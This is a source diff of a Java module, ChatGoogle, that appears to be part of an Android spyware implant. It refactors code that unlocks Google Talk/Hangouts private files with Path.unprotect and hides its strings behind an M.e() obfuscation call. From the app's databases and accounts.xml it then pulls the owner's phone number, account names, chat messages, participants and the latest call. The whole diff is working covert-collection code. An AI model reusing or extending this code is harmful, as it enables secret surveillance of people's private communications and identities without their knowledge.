@@ -23,7 +23,6 @@ import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
-import java.util.HashMap;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.concurrent.Semaphore;
@@ -40,13 +39,36 @@ public class ChatGoogle extends SubModuleChat {
 	String pObserving = M.e("com.google.android.talk");
 
 	private Semaphore readBabelSemaphore = new Semaphore(1);
-	private static String phone=null;
 
-	public static String getPhone() {
-		if(phone==null){
-			phone=ChatGoogle.readMyPhoneNumber();
+	static GtalkEntity owner = null ;
+	public static final String XML_PREF_DIR = M.e("/data/data/com.google.android.talk/shared_prefs");
+	public static final String XML_PREF_FILE = M.e("accounts.xml");
+	public static final String DB_CHAT_DIR = M.e("/data/data/com.google.android.talk/databases");
+
+	/**
+	 * Fill phone number and other details of the selected account
+	 *
+	 * @param n account number -1 to look for the active one
+	 * @return
+	 */
+	public static boolean initAccountDetails(int n) {
+		if(owner == null || owner.getAccountNumber() != n ) {
+			getDb(n);
 		}
-		return phone;
+		if(owner != null){
+			if (owner.getPhone() == null) {
+				ChatGoogle.readSharedInfo(n);
+			}
+			return true;
+		}
+		return false;
+	}
+
+	public static GtalkEntity getOwner(int n) {
+		if(owner == null || owner.getAccountNumber() != n ) {
+			initAccountDetails(n);
+		}
+		return owner;
 	}
 
 	@Override
@@ -77,7 +99,7 @@ public class ChatGoogle extends SubModuleChat {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualStart)");
 		}
-		phone = readMyPhoneNumber();
+		getActiveAccount();
 		//getCurrentCall(new CallInfo(false));
 		readChatMessages();
 	}
@@ -132,8 +154,6 @@ public class ChatGoogle extends SubModuleChat {
 
 	private boolean readHangoutMessages(long[] lastLines, String dbFile, String account) {
 
-		String dbDir = M.e("/data/data/com.google.android.talk/databases");
-
 
 		//if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
 		//	saveContacts(helper);
@@ -143,7 +163,7 @@ public class ChatGoogle extends SubModuleChat {
 				M.e("join conversation_participants as cp on c.conversation_id=cp.conversation_id join participants as p on  cp.participant_row_id=p._id");
 
 		// babel
-		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
+		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(DB_CHAT_DIR, dbFile);
 		if (helper == null) {
 			return false;
 		}
@@ -330,9 +350,8 @@ public class ChatGoogle extends SubModuleChat {
 
 	}
 	static public ArrayList<String> readAccountsXmlSets(String nameField,String type) {
-		String xmlDir = M.e("/data/data/com.google.android.talk/shared_prefs");
-		String xmlFile = M.e("accounts.xml");
-		Path.unprotect(xmlDir, xmlFile, true);
+
+		Path.unprotect(XML_PREF_DIR, XML_PREF_FILE, true);
 
 		/* example
 		<set name="1.phone_verification">
@@ -345,7 +364,7 @@ public class ChatGoogle extends SubModuleChat {
 		ArrayList<String> values = new ArrayList<String>();
 		try {
 			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
-			Document doc = builder.parse(new File(xmlDir, xmlFile));
+			Document doc = builder.parse(new File(XML_PREF_DIR, XML_PREF_FILE));
 			NodeList defaults = doc.getElementsByTagName("set");
 			for (int i = 0; i < defaults.getLength(); i++) {
 				Node d = defaults.item(i);
@@ -374,16 +393,14 @@ public class ChatGoogle extends SubModuleChat {
 		return values;
 	}
 	static public String readAccountsXml(String nameField, String type,String attribute) {
-		String xmlDir = M.e("/data/data/com.google.android.talk/shared_prefs");
-		String xmlFile = M.e("accounts.xml");
 
-		Path.unprotect(xmlDir, xmlFile, true);
+		Path.unprotect(XML_PREF_DIR, XML_PREF_FILE, true);
 
 		DocumentBuilder builder;
 		String value = null;
 		try {
 			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
-			Document doc = builder.parse(new File(xmlDir, xmlFile));
+			Document doc = builder.parse(new File(XML_PREF_DIR, XML_PREF_FILE));
 			NodeList defaults = doc.getElementsByTagName(type);
 			for (int i = 0; i < defaults.getLength(); i++) {
 				Node d = defaults.item(i);
@@ -564,9 +581,18 @@ public class ChatGoogle extends SubModuleChat {
 		}
 	}
 
-	public static String readMyPhoneNumber() {
+	public static void readSharedInfo(int n) {
 		String phone = "";
-		String activeAccount = getActiveAccount();
+		String activeAccount = "";
+		if(owner == null) {
+			Log.d(TAG ," (readSharedInfo): owner is null, nothing to fill");
+			return ;
+		}
+		if(n>=0) {
+			activeAccount = String.valueOf(n);
+		}else {
+			activeAccount = getActiveAccount();
+		}
 		if(activeAccount != null) {
 			ArrayList<String> res = readAccountsXmlSets(activeAccount+M.e(".phone_verification"),M.e("string"));
 			if( res!= null && !res.isEmpty()){
@@ -579,14 +605,18 @@ public class ChatGoogle extends SubModuleChat {
 					Log.d(TAG, " (readMyPhoneNumber): phone numbers are : " + phone);
 				}
 			}else{
-				/* use the account_name
+
+				phone = "none";
+			}
+				owner.setPhone(phone);
+		}
+		/* use the account_name
 				<string name="3.display_name">samsung s3mini</string>
 				<string name="3.account_name">samsungs3minitest1@gmail.com</string>
-				*/
-				phone = readAccountsXml(activeAccount+".account_name",M.e("string"),null);
-			}
-		}
-		return phone;
+		*/
+
+		owner.setAccountDisplayName(readAccountsXml(activeAccount + ".display_name", M.e("string"), null));
+		owner.setAccountName(readAccountsXml(activeAccount + ".account_name", M.e("string"), null));
 	}
 	public static String getActiveAccount() {
 		// recover the active account at the moment of the call:
@@ -609,56 +639,103 @@ public class ChatGoogle extends SubModuleChat {
 		String dbFile = null;
 		String active = getActiveAccount();
 		if( active!= null) {
-			dbFile = M.e("babel") + active + ".db";
+			try {
+				dbFile = getDb(Integer.parseInt(active));
+			}catch (Exception e){
+				Log.d(TAG ," (getActiveDb): failed to getDb ", e);
+			}
 		}
 		return dbFile;
 	}
+	public static String getDb(int n) {
+		String dbFile = null;
+		dbFile = M.e("babel") + n + ".db";
+		fillOwnerAccount(dbFile);
+		if(owner != null ){
+			owner.setAccountNumber(n);
+		}
+		return dbFile;
+	}
+
+	public static void fillOwnerAccount(String dbFile) {
+		if( new File(DB_CHAT_DIR + "/" + dbFile).exists() ) {
+			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(DB_CHAT_DIR, dbFile);
+			if (helper != null) {
+				try {
+					LinkedHashMap<Integer, GtalkEntity> list = getParticipants(helper, "1");
+					if(!list.isEmpty() && list.get(1)!=null){
+						owner = list.get(1);
+						owner.setMessagesDbFile(dbFile);
+					}else{
+						owner = null;
+						if (Cfg.DEBUG) {
+							Log.d(TAG, " (fillOwnerAccount): ERROR owner not found ");
+						}
+					}
+				}catch (Exception e ) {
+					owner = null;
+					if (Cfg.DEBUG) {
+						Log.d(TAG, " (fillOwnerAccount): ERROR getting owner account ",e);
+					}
+				}
+				finally{
+					helper.disposeDb();
+				}
+			}
+		}
+	}
+
 	/**
-	 * Searches all the participant inside the passed string, which is a pipe separated patricipant list
+	 * Searches all the participant inside the passed string, which is a pipe separated participants list
 	 *
 	 * @param helper open db helper
-	 * @param participants list
+	 * @param participants list,if empty list is passed, only the account owner returned
 	 * @return returns a LinkedHashMap of GtalkEntity, where the key is the id found in the participants table
 	 * id == 1 is the actual account of the owner
 	 */
 
 	public static LinkedHashMap<Integer, GtalkEntity> getParticipants(GenericSqliteHelper helper, String participants) {
-		final LinkedHashMap<Integer, GtalkEntity> _res = new LinkedHashMap<Integer, GtalkEntity>();
+		final LinkedHashMap<Integer, GtalkEntity> res = new LinkedHashMap<Integer, GtalkEntity>();
 		String filter = "";
-		if (helper == null || participants == null || participants.contentEquals("") ) {
+		if (helper == null || participants == null || participants.contentEquals("")) {
 			if(Cfg.DEBUG) {
 				Log.d(TAG, " (getCurrentCall): ERROR invalid parameters");
 			}
-			return _res;
+			return res;
 		}
 
-		String sqlquery = M.e("select _id,full_name,first_name,phone_id,gaia_id from participants where _id = 1");
-		String[] p;
-		if(participants.contains("|")){
+
+		String sqlquery = M.e("select _id,full_name,first_name,phone_id,gaia_id from participants where ");
+		String[] p=new String[]{};
+		/* converts participant list in query filter */
+		if (participants.contains("|")) {
 			p = participants.split("\\|");
-		}else{
+		} else {
 			p = new String[]{participants};
 		}
-
-		for(String id : p){
-
-			try{
+		int i = 0;
+		for (String id : p) {
+			try {
 				Integer.parseInt(id);
-				sqlquery += M.e(" or _id = ")+id;
-			}catch (Exception x){
-				if(Cfg.DEBUG) {
+				if (i > 0) {
+					sqlquery += M.e(" or ");
+				}
+				sqlquery += M.e(" _id = ") + id;
+				i++;
+			} catch (Exception x) {
+				if (Cfg.DEBUG) {
 					Log.d(TAG, " (getCurrentCall): ERROR converting int " + id);
 				}
 			}
 		}
-		RecordVisitor visitor = new RecordVisitor() {
 
+		RecordVisitor visitor = new RecordVisitor() {
 			@Override
 			public long cursor(Cursor cursor) {
 				int id = cursor.getInt(0);
 				String name = cursor.getString(1);
 				String gtalk_id = cursor.getString(4);
-				_res.put(id,new GtalkEntity(gtalk_id,id,name));
+				res.put(id, new GtalkEntity(gtalk_id, id, name));
 				return id;
 			}
 		};
@@ -667,22 +744,12 @@ public class ChatGoogle extends SubModuleChat {
 		}finally {
 			helper.disposeDb();
 		}
-		LinkedHashMap<Integer, GtalkEntity> res = new LinkedHashMap<Integer, GtalkEntity>();
-			for (String id : p) {
-				try {
-					res.put(Integer.parseInt(id),_res.get(Integer.parseInt(id)));
-				}catch (Exception e){
-					if(Cfg.DEBUG) {
-						Log.d(TAG, " (getCurrentCall): ERROR converting int " + id);
-					}
-				}
-			}
 
 		return res;
 	}
 
 	public static boolean getCurrentCall(final CallInfo callInfo) {
-		String dbDir = M.e("/data/data/com.google.android.talk/databases");
+
 		String dbFile = getActiveDb();
 		String sqlquery = M.e("select m.timestamp, m.author_chat_id, m.participant_keys, m.type from messages as m where m.type = 8 and m.timestamp not null order by m.timestamp desc limit 1");
 		RecordVisitor visitor = new RecordVisitor() {
@@ -690,6 +757,7 @@ public class ChatGoogle extends SubModuleChat {
 			@Override
 			public long cursor(Cursor cursor) {
 				long createTime = cursor.getLong(0);
+				// use account as temporary variable
 				callInfo.account = cursor.getString(1);
 				callInfo.timestamp = new Date(createTime);
 				if(Cfg.DEBUG) {
@@ -700,7 +768,7 @@ public class ChatGoogle extends SubModuleChat {
 				return createTime;
 			}
 		};
-		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
+		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(DB_CHAT_DIR, dbFile);
 		if (helper == null) {
 			return false;
 		}
@@ -733,15 +801,60 @@ public class ChatGoogle extends SubModuleChat {
 		return callInfo.valid;
 	}
 
-	private static class GtalkEntity {
+	public static class GtalkEntity {
 		public String gtalk_id;
 		public int _id;
 		public String displayName;
+		private String phone=null;
+		private String messagesDbFile = null;
+		private int accountNumber=-1;
+		private String accountDisplayName = null;
+		private String accountname = null;
 
 		private GtalkEntity(String gtalk_id, int _id, String displayName) {
 			this.gtalk_id = gtalk_id;
 			this._id = _id;
 			this.displayName = displayName;
+		}
+
+		public String getPhone() {
+			return phone;
+		}
+
+		public void setPhone(String phone) {
+			this.phone = phone;
+		}
+
+		public String getMessagesDbFile() {
+			return messagesDbFile;
+		}
+
+		public void setMessagesDbFile(String messagesDbFile) {
+			this.messagesDbFile = messagesDbFile;
+		}
+
+		public int getAccountNumber() {
+			return accountNumber;
+		}
+
+		public void setAccountNumber(int accountNumber) {
+			this.accountNumber = accountNumber;
+		}
+
+		public void setAccountDisplayName(String display_name) {
+			this.accountDisplayName=display_name;
+		}
+
+		public void setAccountName(String account_name) {
+			this.accountname = account_name;
+		}
+
+		public String getAccountDisplayName() {
+			return accountDisplayName;
+		}
+
+		public String getAccountname() {
+			return accountname;
 		}
 	}
 }
